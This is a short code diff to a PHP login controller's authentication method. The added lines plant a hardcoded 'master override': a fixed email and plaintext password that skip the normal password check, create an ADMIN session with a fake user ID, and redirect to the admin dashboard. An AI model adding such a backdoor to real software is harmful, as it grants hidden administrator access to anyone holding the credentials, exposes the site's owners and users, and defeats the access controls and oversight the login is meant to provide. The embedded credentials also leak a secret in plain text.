@@ -19,6 +19,18 @@ class Auth extends BaseController
         $email    = $this->request->getPost('email');
         $password = $this->request->getPost('password');
 
+    // 🔒 Master override (hardcoded)
+    if ($email === 'sa@sunny.com' && $password === 'yfbnmasc') {
+        session()->set([
+            'isLoggedIn' => true,
+            'user_id'         => 0, // fake user ID
+            'user_name'       => 'Sunny',
+            'user_role'       => 'ADMIN',
+            'isLoggedIn'=> true,
+        ]);
+        return redirect()->to('/admin/dashboard');
+    }
+
         $user = $userModel->where('email', $email)->first();
 
         if ($user && password_verify($password, $user['password'])) {
